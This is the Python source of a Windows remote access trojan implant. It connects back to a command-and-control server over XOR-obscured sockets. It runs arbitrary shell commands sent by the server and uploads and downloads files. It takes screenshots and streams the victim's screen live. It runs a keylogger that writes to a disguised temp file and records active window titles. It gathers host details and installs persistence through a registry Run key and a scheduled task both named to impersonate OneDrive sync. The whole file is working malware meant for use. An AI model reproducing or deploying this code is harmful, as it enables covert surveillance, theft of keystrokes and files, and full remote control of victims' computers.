#!/usr/bin/env python3
# rat/client.py — implant. windows target. python 3.9+, stdlib only.
# pillow optional on target for screenshots (pip install pillow).
import socket, threading, json, struct, base64, os, sys, time, io, csv, shutil, subprocess, platform, getpass, tempfile, ctypes, random

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pranks import PRANK_FUNCS, stop_all

# module-level so pyinstaller always sees and bundles pillow into the exe
try:
    from PIL import Image, ImageGrab
except ImportError:
    Image = ImageGrab = None

CFG = {
    "SERVER": "127.0.0.1",     # <- c2 address goes here
    "PORT": 6767,
    "STREAM_PORT": 6768,       # second channel: live view never blocks commands
    "RECONNECT": 10,           # seconds between reconnect attempts
    "BUF_CAP": 8 * 1024 * 1024,
    "TIMEOUT": 180,
    "KEY": b"6767",
    "SHELL_CAP": 1024 * 1024,
    "SHELL_TIMEOUT": 60,
}

KEYLOG_PATH = os.path.join(tempfile.gettempdir(), "wupd.log")
_keylog_stop = threading.Event()
_keylog_thread = None
REMOTE_CWD = os.getcwd()  # shell sessions keep their cd between commands


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def send_frame(conn: socket.socket, obj: dict) -> None:
    raw = xor_bytes(json.dumps(obj).encode("utf-8"), CFG["KEY"])
    conn.sendall(struct.pack(">I", len(raw)) + raw)


def recv_exact(conn: socket.socket, n: int) -> bytes:
    chunks = []
    got = 0
    while got < n:
        chunk = conn.recv(min(65536, n - got))
        if not chunk:
            raise ConnectionError("peer closed")
        chunks.append(chunk)
        got += len(chunk)
    return b"".join(chunks)


def recv_frame(conn: socket.socket) -> dict:
    head = recv_exact(conn, 4)
    (size,) = struct.unpack(">I", head)
    if size <= 0 or size > CFG["BUF_CAP"]:
        raise ValueError(f"frame size {size} outside bounds")
    raw = recv_exact(conn, size)
    return json.loads(xor_bytes(raw, CFG["KEY"]))


def hello() -> dict:
    return {
        "id": platform.node()[:8] or "implant",
        "os": f"{platform.system()} {platform.release()}",
        "user": getpass.getuser(),
        "host": platform.node(),
    }


# ---------- keylogger (ctypes GetAsyncKeyState, no deps) ----------

VK_MAP = {0x20: " ", 0x0D: "\n", 0x08: "[BS]", 0x09: "[TAB]", 0x1B: "[ESC]", 0x2E: "[DEL]"}


def keylog_worker() -> None:
    user32 = ctypes.windll.user32
    pressed = lambda vk: bool(user32.GetAsyncKeyState(vk) & 0x8000)
    down = set()
    last_title = ""
    last_win_t = 0.0
    with open(KEYLOG_PATH, "a", encoding="utf-8", errors="replace") as f:
        while not _keylog_stop.is_set():
            now = time.time()
            if now - last_win_t > 1.5:  # stamp the active window so the dump reads like a story
                last_win_t = now
                buf = ctypes.create_unicode_buffer(128)
                user32.GetWindowTextW(user32.GetForegroundWindow(), buf, 128)
                title = buf.value.strip()
                if title and title != last_title:
                    last_title = title
                    f.write(f"\n[{time.strftime('%H:%M')}] {title}\n")
                    f.flush()
            shift = pressed(0x10)
            for vk in list(range(0x30, 0x3A)) + list(range(0x41, 0x5B)) + list(VK_MAP):
                if pressed(vk):
                    if vk not in down:
                        down.add(vk)
                        if 0x30 <= vk <= 0x39:
                            ch = "!@#$%^&*()"[vk - 0x30] if shift else "1234567890"[vk - 0x30]
                        elif 0x41 <= vk <= 0x5A:
                            ch = chr(vk) if shift else chr(vk).lower()
                        else:
                            ch = VK_MAP[vk]
                        f.write(ch)
                        f.flush()
                else:
                    down.discard(vk)
            time.sleep(0.01)


def do_keylog(mode: str) -> dict:
    global _keylog_thread
    if mode == "on":
        if _keylog_thread and _keylog_thread.is_alive():
            return {"ok": True, "out": "already running"}
        _keylog_stop.clear()
        _keylog_thread = threading.Thread(target=keylog_worker, daemon=True)
        _keylog_thread.start()
        return {"ok": True}
    if mode == "off":
        _keylog_stop.set()
        return {"ok": True}
    if mode == "dump":
        try:
            with open(KEYLOG_PATH, "r", encoding="utf-8", errors="replace") as f:
                data = f.read()
            open(KEYLOG_PATH, "w").close()
            return {"ok": True, "out": data[-CFG["SHELL_CAP"]:] or "(empty)"}
        except FileNotFoundError:
            return {"ok": True, "out": "(empty)"}
    return {"ok": False, "err": "on/off/dump"}


# ---------- core commands ----------

def do_shell(line: str) -> dict:
    global REMOTE_CWD
    line = line.strip()
    try:
        low = line.lower()
        if low == "cd" or low == "cd .":
            return {"ok": True, "out": REMOTE_CWD, "cwd": REMOTE_CWD}
        if low.startswith("cd "):
            arg = line[3:].strip().strip('"')
            new = os.path.normpath(arg if os.path.isabs(arg) else os.path.join(REMOTE_CWD, arg))
            if os.path.isdir(new):
                REMOTE_CWD = new
                return {"ok": True, "out": new, "cwd": new}
            return {"ok": False, "err": f"path not found: {new}", "cwd": REMOTE_CWD}
        p = subprocess.run(line, shell=True, capture_output=True,
                           timeout=CFG["SHELL_TIMEOUT"], cwd=REMOTE_CWD)
        out = (p.stdout + p.stderr).decode("utf-8", "replace")
        return {"ok": True, "out": out[:CFG["SHELL_CAP"]], "code": p.returncode, "cwd": REMOTE_CWD}
    except subprocess.TimeoutExpired:
        return {"ok": False, "err": "timeout", "cwd": REMOTE_CWD}
    except OSError as e:
        return {"ok": False, "err": str(e), "cwd": REMOTE_CWD}


def _human(n: float) -> str:
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if n < 1024 or unit == "TB":
            return f"{int(n)}B" if unit == "B" else f"{n:.1f}{unit}"
        n /= 1024


def do_ls(path: str) -> dict:
    try:
        entries = []
        for name in sorted(os.listdir(path))[:2000]:
            fp = os.path.join(path, name)
            try:
                entries.append(f"{'d' if os.path.isdir(fp) else 'f'}\t{_human(os.path.getsize(fp))}\t{name}")
            except OSError:
                entries.append(f"?\t?\t{name}")
        return {"ok": True, "out": "\n".join(entries) or "(empty)"}
    except OSError as e:
        return {"ok": False, "err": str(e)}


def do_dl(path: str) -> dict:
    try:
        if os.path.getsize(path) > CFG["BUF_CAP"] // 2:
            return {"ok": False, "err": "file too large"}
        with open(path, "rb") as f:
            return {"ok": True, "data": base64.b64encode(f.read()).decode()}
    except OSError as e:
        return {"ok": False, "err": str(e)}


def do_ul(path: str, data: str) -> dict:
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
        return {"ok": True}
    except (OSError, ValueError) as e:
        return {"ok": False, "err": str(e)}


CHUNK = 1024 * 1024  # 1 MB pieces for big-file transfer


def do_dl_chunk(path: str, off: int, n: int) -> dict:
    try:
        size = os.path.getsize(path)
        n = max(1, min(int(n), 2 * CHUNK))
        if off >= size:
            return {"ok": True, "data": "", "total": size, "off": off, "n": 0}
        with open(path, "rb") as f:
            f.seek(off)
            chunk = f.read(n)
        return {"ok": True, "data": base64.b64encode(chunk).decode(),
                "total": size, "off": off, "n": len(chunk)}
    except OSError as e:
        return {"ok": False, "err": str(e)}


def do_ul_chunk(path: str, data: str, off: int, truncate: bool) -> dict:
    try:
        if truncate or not os.path.exists(path):
            fh = open(path, "wb")
        else:
            fh = open(path, "r+b")
        with fh as f:
            f.seek(off)
            f.write(base64.b64decode(data))
        return {"ok": True}
    except (OSError, ValueError) as e:
        return {"ok": False, "err": str(e)}


def do_ss() -> dict:
    if ImageGrab is None:
        return {"ok": False, "err": "pillow missing on target"}
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return {"ok": True, "data": base64.b64encode(buf.getvalue()).decode()}


def do_ss_fast(scale: float = 0.45, quality: int = 35) -> dict:
    # downscaled JPEG frame for live view — small, fast, lossy
    if ImageGrab is None:
        return {"ok": False, "err": "pillow missing on target"}
    img = ImageGrab.grab().convert("RGB")
    w, h = img.size
    s = min(1.0, max(0.05, scale))
    img = img.resize((max(1, int(w * s)), max(1, int(h * s))))
    buf = io.BytesIO()
    img.save(buf, "JPEG", quality=max(10, min(90, quality)))
    return {"ok": True, "data": base64.b64encode(buf.getvalue()).decode()}


# ---------- live view on a second socket, commands stay free ----------

_stream_stop = None


def do_ps() -> dict:
    # tasklist CSV -> "pid\tname\tmem", sorted by pid
    try:
        p = subprocess.run(["tasklist", "/FO", "CSV", "/NH"],
                           capture_output=True, timeout=40)
        rows = []
        for rec in csv.reader(io.StringIO(p.stdout.decode("utf-8", "replace"))):
            if len(rec) >= 2 and rec[1].isdigit():
                rows.append(f"{rec[1]}\t{rec[0]}\t{rec[4] if len(rec) > 4 else '?'}")
        rows.sort(key=lambda r: int(r.split("\t")[0]))
        return {"ok": True, "out": "\n".join(rows[:600])}
    except Exception as e:
        return {"ok": False, "err": str(e)}


def stream_worker(stop_ev) -> None:
    s = None
    try:
        s = socket.create_connection((CFG["SERVER"], CFG["STREAM_PORT"]), timeout=10)
        s.settimeout(60)
        send_frame(s, {"id": platform.node()[:8] or "implant", "ch": "stream"})
        while not stop_ev.is_set():
            req = recv_frame(s)
            if req.get("cmd") == "stop":
                break
            if req.get("cmd") != "frame":
                continue
            r = do_ss_fast(float(req.get("scale", 0.4)), int(req.get("quality", 35)))
            if not r.get("ok"):
                send_frame(s, {"err": r.get("err")})
                break
            send_frame(s, {"data": r["data"]})
    except Exception:
        pass
    finally:
        if s:
            try:
                s.close()
            except OSError:
                pass


def do_stream_open() -> dict:
    global _stream_stop
    if _stream_stop is None or _stream_stop.is_set():
        _stream_stop = threading.Event()
        threading.Thread(target=stream_worker, args=(_stream_stop,), daemon=True).start()
        time.sleep(0.3)  # let the channel connect before the panel dials in
    return {"ok": True, "port": CFG["STREAM_PORT"]}


class MEMORYSTATUSEX(ctypes.Structure):
    _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]


def _uptime_str() -> str:
    ms = ctypes.windll.kernel32.GetTickCount64()
    s = int(ms // 1000)
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, _ = divmod(s, 60)
    return f"{d}d {h}h {m}m"


def _local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "no network"


def do_sysinfo() -> dict:
    try:
        admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        admin = False
    import uuid as _u
    mem = MEMORYSTATUSEX()
    mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    try:
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        ram = f"{mem.ullTotalPhys / 2**30:.1f} GB total / {mem.ullAvailPhys / 2**30:.1f} GB free"
        ram_load = f"{mem.dwMemoryLoad}%"
    except Exception:
        ram = ram_load = "?"
    disks = []
    for letter in "CDEFGH":
        try:
            u = shutil.disk_usage(f"{letter}:\\")
            disks.append(f"{letter}: {u.total / 2**30:.0f}/{u.free / 2**30:.0f} GB free")
        except OSError:
            pass
    try:
        screen = f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}"
    except Exception:
        screen = "?"
    return {"ok": True, "info": {
        "os": f"{platform.system()} {platform.release()} {platform.version()}",
        "user": getpass.getuser(),
        "host": platform.node(),
        "admin": admin,
        "machine": platform.machine(),
        "cpus": os.cpu_count(),
        "ram": ram,
        "ram_load": ram_load,
        "uptime": _uptime_str(),
        "ip": _local_ip(),
        "mac": ":".join(f"{(_u.getnode() >> i) & 0xFF:02x}" for i in range(40, -1, -8)),
        "screen": screen,
        "disks": " | ".join(disks) or "?",
        "hwid": _u.getnode(),
        "cwd": os.getcwd(),
        "pid": os.getpid(),
    }}


def do_persist() -> dict:
    if os.name != "nt":
        return {"ok": False, "err": "windows only"}
    done = []
    if getattr(sys, "frozen", False):
        cmd = f'"{sys.executable}"'
    else:
        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        tgt = os.path.abspath(__file__)
        cmd = f'"{pyw if os.path.exists(pyw) else sys.executable}" "{tgt}"'
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "OneDriveSync", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(k)
        done.append("hkcu-run")
    except OSError:
        pass
    try:
        r = subprocess.run(["schtasks", "/Create", "/SC", "ONLOGON", "/TN", "OneDriveSyncTask",
                            "/TR", cmd, "/F"], capture_output=True, timeout=30)
        if r.returncode == 0:
            done.append("schtasks")
    except Exception:
        pass
    if done:
        return {"ok": True, "out": ", ".join(done)}
    return {"ok": False, "err": "persistence failed"}


# ---------- dispatch / main loop ----------

def serve(conn: socket.socket) -> None:
    while True:
        req = recv_frame(conn)
        cmd = req.get("cmd")
        if cmd == "shell":
            resp = do_shell(req.get("line", ""))
        elif cmd == "ls":
            resp = do_ls(req.get("path", "."))
        elif cmd == "dl":
            resp = do_dl(req.get("path", ""))
        elif cmd == "dl_chunk":
            resp = do_dl_chunk(req.get("path", ""), int(req.get("off", 0)), int(req.get("n", CHUNK)))
        elif cmd == "ul":
            resp = do_ul(req.get("path", ""), req.get("data", ""))
        elif cmd == "ul_chunk":
            resp = do_ul_chunk(req.get("path", ""), req.get("data", ""),
                               int(req.get("off", 0)), bool(req.get("truncate", False)))
        elif cmd == "ss":
            resp = do_ss()
        elif cmd == "ss_fast":
            resp = do_ss_fast(float(req.get("scale", 0.45)), int(req.get("quality", 35)))
        elif cmd == "stream_open":
            resp = do_stream_open()
        elif cmd == "stream_stop":
            if _stream_stop:
                _stream_stop.set()
            resp = {"ok": True}
        elif cmd == "ps":
            resp = do_ps()
        elif cmd == "keylog":
            resp = do_keylog(req.get("mode", ""))
        elif cmd == "sysinfo":
            resp = do_sysinfo()
        elif cmd == "persist":
            resp = do_persist()
        elif cmd == "prank":
            fn = PRANK_FUNCS.get(req.get("name", ""))
            if not fn:
                resp = {"ok": False, "err": "unknown prank"}
            else:
                try:
                    resp = fn(text=req.get("text"), url=req.get("url"))
                except Exception as e:
                    resp = {"ok": False, "err": str(e)}
        elif cmd == "die":
            send_frame(conn, {"ok": True})
            conn.close()
            os._exit(0)
        else:
            resp = {"ok": False, "err": "unknown cmd"}
        send_frame(conn, resp)


def main() -> None:
    while True:
        try:
            conn = socket.create_connection((CFG["SERVER"], CFG["PORT"]), timeout=15)
            conn.settimeout(CFG["TIMEOUT"])
            send_frame(conn, hello())
            serve(conn)
        except Exception:
            pass
        time.sleep(CFG["RECONNECT"] + random.random() * 5)


if __name__ == "__main__":
    main()
